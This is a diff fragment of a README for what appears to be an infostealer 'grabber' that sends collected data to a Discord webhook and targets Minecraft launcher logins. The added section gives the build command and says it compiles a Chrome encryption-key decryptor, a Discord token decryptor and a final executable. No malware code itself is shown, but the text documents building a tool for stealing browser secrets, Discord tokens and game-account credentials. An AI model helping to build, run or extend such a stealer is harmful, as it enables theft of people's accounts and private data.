@@ -23,6 +23,17 @@ Some of these functionalities are customisable in the [`config.js`](config.js) f
 
 All that are sent to a Discord webhook. 
 
+## Building
+
+Use this command:
+
+```bash
+yarn build
+```
+
+This will build the Chrome-based encryption key decryptor, the Discord token decryptor, build the icon to a ``.ico`` file, and then build the final exe.
+
+> The EXE build can be **very long** (about 20 minutes), so be very patient ^^
 ## Notes
 
 ### Minecraft Launchers that the grabber try to get login infos:
